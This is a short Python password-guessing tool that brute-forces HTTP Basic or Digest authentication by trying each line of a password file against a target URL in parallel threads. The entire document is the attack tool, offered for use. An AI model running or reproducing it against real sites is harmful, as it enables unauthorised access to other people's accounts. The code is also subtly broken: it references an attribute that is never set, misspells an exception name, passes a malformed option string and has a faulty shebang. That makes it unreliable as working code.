#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/24/2021

import requests
from threading import Thread
import sys
import time
import getopt
from requests.auth import HTTPDigestAuth

global hit
hit = "1"

def banner():
    print('''        --------------------
        BASE OR DIGEST AUTH
        --------------------''')
def usage():
    print("Usage: -w <URL> -u <username> -t <number of threads> -f <dictionary file> -m <method (basic or digest)>")
    print("Example: python3 baseDigestAuth.py -w http://randomsite.com -u admin -t 5 -f passwords.txt -m basic\n")


class request_performer(Thread):
    def __init__(self, passwd, user, url, method):
        Thread.__init__(self)
        self.password = passwd.split("\n")[0]
        self.username = user
        self.url = url
        self.method = method
        print("-" + self.password + "-")

    def run(self):
        global hit
        
        if hit == "1":
            try:
                if self.method == "basic":
                    r = requests.get(self.url, auth=(self.user, self.password))
                elif self.method == "digest":
                    r = requests.get(self.url, auth=HTTPDigestAuth(self.user, self.password))

                if r.status_code == 200:
                    hit = "0"
                    print("[+] Password Found - " + self.password)
                    sys.exit()
                else:
                    print("[-] Not Valid Password: " + self.password)
                    i[0] = i[0] - 1
            except Exception as e:
                print(e)
                    
def start(argv):
    banner()
    if len(sys.argv) < 5:
        usage()
        sys.exit()

    try:
        opts, args = getopt.getopt(argv, "u:w:f:m:t")    
    except getopt.Getopterror:
        print("[-] Invalid Arguments")
        sys.exit()

    method = ""
    user = ""
    url = ""
    threads = 0
    for opt, arg in opts:
        if opt == '-u':
            user = arg
        elif opt == '-t':
            threads = arg
        elif opt == '-w':
            url = arg
        elif opt == '-f':
            dictionary = arg
        elif opt == '-m':
            method = arg

    try:
        f = open(dictionary, "r")
        passwords = f.readlines()
    except:
        print("[-] Error. File Does Not Exist")
        sys.exit()
    
    launchThreads(passwords, threads, user, url, method)

def launchThreads(passwords, threads, user, url, method):
    global i
    i = []
    i.append(0)
    while len(passwords):
        if hit == "1":
            try:
                if i[0] < int(threads):
                    password = passwords.pop(0)
                    i[0] = i[0] + 1
                    thread = request_performer(password, user, url, method)
                    thread.start()

            except KeyboardInterrupt:
                print("Program Interrupted")
                sys.exit()
            thread.join()

if __name__ == "__main__":
    try:
        start(sys.argv[1:])
    except KeyboardInterrupt:
        print("[-] Program Interrupted")
